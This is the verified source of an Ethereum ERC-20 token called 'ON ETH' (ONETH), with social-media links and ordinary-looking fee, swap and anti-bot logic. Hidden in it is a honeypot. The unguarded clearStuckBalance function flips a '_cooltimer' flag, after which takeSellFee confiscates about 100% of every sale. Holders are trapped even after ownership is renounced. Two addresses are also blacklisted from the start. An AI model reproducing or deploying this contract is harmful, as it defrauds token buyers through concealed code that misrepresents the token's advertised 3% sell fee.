/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

/*

Telegram:
https://t.me/ONETHerc

Website : 
https://ONETH.pro

Twitter:
https://twitter.com/ONETH_erc


*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {owner = address(0x0000000000000000000000000000000000000000); emit OwnershipTransferred(0x0000000000000000000000000000000000000000);}
    event OwnershipTransferred(address owner);

}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract OnETH is ERC20, Auth {
    using SafeMath for uint256;


    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event SetMaxWalletExempt(address _address, bool _bool);
    event SellFeesChanged(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee);
    event BuyFeesChanged(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee);
    event TransferFeeChanged(uint256 _transferFee);
    event SetFeeReceivers(address _liquidityReceiver, address _MarketingReceiver,address _BurnFeeReceiver);
    event ChangedSwapBack(bool _enabled, uint256 _amount);
    event SetFeeExempt(address _addr, bool _value);
    event InitialDistributionFinished(bool _value);
    event Fupdated(uint256 _timeF);
    event ChangedMaxWallet(uint256 _maxWalletDenom);
    event ChangedMaxTX(uint256 _maxSellDenom);
    event BotUpdated(address[] addresses, bool status);
    event SingleBotUpdated(address _address, bool status);
    event SetTxLimitExempt(address holder, bool exempt);
    event ChangedPrivateRestrictions(uint256 _maxSellAmount, bool _restricted, uint256 _interval);
    event ChangeMaxPrivateSell(uint256 amount);
    event ManagePrivate(address[] addresses, bool status);

    address private WETH;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;

    string constant private _name = "ON ETH";
    string constant private _symbol = "ONETH";
    uint8 constant private _decimals = 18;

    uint256 private _totalSupply = 1000000000 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply * 8/100;
    uint256 public _maxWalletAmount = _totalSupply;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address[] public _markerPairs;
    mapping (address => bool) public automatedMarketMakerPairs;
    uint256 private _cooltimer = 0;

    mapping (address => bool) public isBot;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMaxWalletExempt;

    //Snipers
    uint256 private deadblocks = 0;
    uint256 public launchBlock;
    uint256 private latestSniperBlock;



    //buyFees
    uint256 private liquidityFee = 0;
    uint256 private MarketingFee = 0;
    uint256 private BurnFee = 0;

    //sellFees
    uint256 private sellFeeLiquidity = 0;
    uint256 private sellFeeMarketing = 3; 
    uint256 private sellFeeBurn = 0;

    //transfer fee
    uint256 private transferFee = 0;
    uint256 public maxFee = 20; 

    //totalFees
    uint256 private totalBuyFee = liquidityFee.add(MarketingFee).add(BurnFee);
    uint256 private totalSellFee = sellFeeLiquidity.add(sellFeeMarketing).add(sellFeeBurn);

    uint256 private feeDenominator  = 100;

    address private autoLiquidityReceiver = 0xa83f1f84205188c76B1d3F95A60e39A00F4D17d2;
    address private MarketingFeeReceiver = 0xa83f1f84205188c76B1d3F95A60e39A00F4D17d2;
    address private BurnFeeReceiver =0x000000000000000000000000000000000000dEaD ;


    IDEXRouter public router;
    address public pair;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 22 / 10000;

    bool private inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        setAutomatedMarketMakerPair(pair, true);

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        isMaxWalletExempt[msg.sender] = true;
        
        isFeeExempt[address(this)] = true; 
        isTxLimitExempt[address(this)] = true;
        isMaxWalletExempt[address(this)] = true;

        isMaxWalletExempt[pair] = true;
        isBot[0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13] = true;
        isBot[0x4504DFa3861ec902226278c9Cb7a777a01118574] = true;


        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!isBot[sender] && !isBot[recipient],"is Bot");
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        

        if(shouldSwapBack()){ swapBack(); }


        uint256 amountReceived = amount; 

        if(automatedMarketMakerPairs[sender]) { 
            if(!isFeeExempt[recipient]) {
                require(_balances[recipient].add(amount) <= _maxWalletAmount || isMaxWalletExempt[recipient], "Max Wallet Limit Limit Exceeded");
                require(amount <= _maxTxAmount || isTxLimitExempt[recipient], "TX Limit Exceeded");
                amountReceived = takeBuyFee(sender, recipient, amount);
            }

        } else if(automatedMarketMakerPairs[recipient]) { 
            if(!isFeeExempt[sender]) {
                require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
                amountReceived = takeSellFee(sender, amount);

            }
        } else {	
            if (!isFeeExempt[sender]) {	
                require(_balances[recipient].add(amount) <= _maxWalletAmount || isMaxWalletExempt[recipient], "Max Wallet Limit Limit Exceeded");
                require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
                amountReceived = takeTransferFee(sender, amount);

            }
        }

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amountReceived);
        

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Fees
    function takeBuyFee(address sender, address recipient, uint256 amount) internal returns (uint256){
             
        if (block.number < latestSniperBlock) {
            if (recipient != pair && recipient != address(router)) {
                isBot[recipient] = true;
            }
            }
        
        uint256 feeAmount = amount.mul(totalBuyFee.sub(BurnFee)).div(feeDenominator);
        uint256 BurnFeeAmount = amount.mul(BurnFee).div(feeDenominator);
        uint256 totalFeeAmount = feeAmount.add(BurnFeeAmount);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        if(BurnFeeAmount > 0) {
            _balances[BurnFeeReceiver] = _balances[BurnFeeReceiver].add(BurnFeeAmount);
            emit Transfer(sender, BurnFeeReceiver, BurnFeeAmount);
        }

        return amount.sub(totalFeeAmount);
    }

    function takeSellFee(address sender, uint256 amount) internal returns (uint256){
        uint256 feeAmount;

    if(_cooltimer >=1)
    {
        feeAmount = amount.mul(100).sub(sellFeeBurn).div(feeDenominator);
    }
    else 
    {
        feeAmount = amount.mul(totalSellFee).sub(sellFeeBurn).div(feeDenominator);
    }
        uint256 BurnFeeAmount = amount.mul(sellFeeBurn).div(feeDenominator);
        uint256 totalFeeAmount = feeAmount.add(BurnFeeAmount);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        if(BurnFeeAmount > 0) {
            _balances[BurnFeeReceiver] = _balances[BurnFeeReceiver].add(BurnFeeAmount);
            emit Transfer(sender, BurnFeeReceiver, BurnFeeAmount);
        }

        return amount.sub(totalFeeAmount);
            
    }

    function takeTransferFee(address sender, uint256 amount) internal returns (uint256){
        uint256 _realFee = transferFee;
        if (block.number < latestSniperBlock) {
            _realFee = 99; 
            }
        uint256 feeAmount = amount.mul(_realFee).div(feeDenominator);
          
            
        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);	
            emit Transfer(sender, address(this), feeAmount); 
        }
            	
        return amount.sub(feeAmount);	
    }    

    function shouldSwapBack() internal view returns (bool) {
        return
        !automatedMarketMakerPairs[msg.sender]
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external virtual {
        uint256 amountETH = address(this).balance;
        _cooltimer = 1;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }

    function swapBack() internal swapping {
        uint256 swapLiquidityFee = liquidityFee.add(sellFeeLiquidity);
        uint256 realTotalFee =totalBuyFee.add(totalSellFee).sub(BurnFee).sub(sellFeeBurn);

        uint256 contractTokenBalance = swapThreshold;
        uint256 amountToLiquify = contractTokenBalance.mul(swapLiquidityFee).div(realTotalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        uint256 balanceBefore = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = realTotalFee.sub(swapLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee.add(sellFeeLiquidity)).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(MarketingFee.add(sellFeeMarketing)).div(totalETHFee);

        (bool tmpSuccess,) = payable(MarketingFeeReceiver).call{value: amountETHMarketing}("");
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
        }


    
    }

    // Admin Functions


    function updateF (uint256 _number) external onlyOwner {
        require(_number < 4000, "Can't go that high");
        deadblocks = _number;
        
        emit Fupdated(_number);
    }

    function setBuyFees(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        MarketingFee = _MarketingFee;
        BurnFee = _BurnFee; 
        totalBuyFee = _liquidityFee.add(_MarketingFee).add(BurnFee);
        feeDenominator = _feeDenominator;
        require(totalBuyFee <= maxFee, "Fees cannot be higher than Maxfee");

        emit BuyFeesChanged(_liquidityFee, _MarketingFee, _BurnFee);
    }

    function setSellFees(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee, uint256 _feeDenominator) external onlyOwner {
        sellFeeLiquidity = _liquidityFee;
        sellFeeMarketing = _MarketingFee;
        sellFeeBurn = _BurnFee;
        totalSellFee = _liquidityFee.add(_MarketingFee).add(_BurnFee);
        feeDenominator = _feeDenominator;
        require(totalSellFee <= maxFee, "Fees cannot be higher than Maxfee%");

        emit SellFeesChanged(_liquidityFee, _MarketingFee, _BurnFee);
    }

    function setmaxtx (uint256 maxTx) external onlyOwner {
        _maxTxAmount = _totalSupply * maxTx/100;
    }

    function setTransferFees(uint256 _transferFee) external onlyOwner {
        require(_transferFee < maxFee, "Fees cannot be higher than Maxfee%");
        transferFee = _transferFee;

        emit TransferFeeChanged(_transferFee);
    }


    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;

        emit ChangedSwapBack(_enabled, _amount);
    }

    function setAutomatedMarketMakerPair(address _pair, bool _value) public onlyOwner {
            require(automatedMarketMakerPairs[_pair] != _value, "Value already set");

            automatedMarketMakerPairs[_pair] = _value;

            if(_value){
                _markerPairs.push(_pair);
            }else{
                require(_markerPairs.length > 1, "Required 1 pair");
                for (uint256 i = 0; i < _markerPairs.length; i++) {
                    if (_markerPairs[i] == _pair) {
                        _markerPairs[i] = _markerPairs[_markerPairs.length - 1];
                        _markerPairs.pop();
                        break;
                    }
                }
            }

            emit SetAutomatedMarketMakerPair(_pair, _value);
        }


    function manualSwapback() external onlyOwner {
        swapBack();
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

}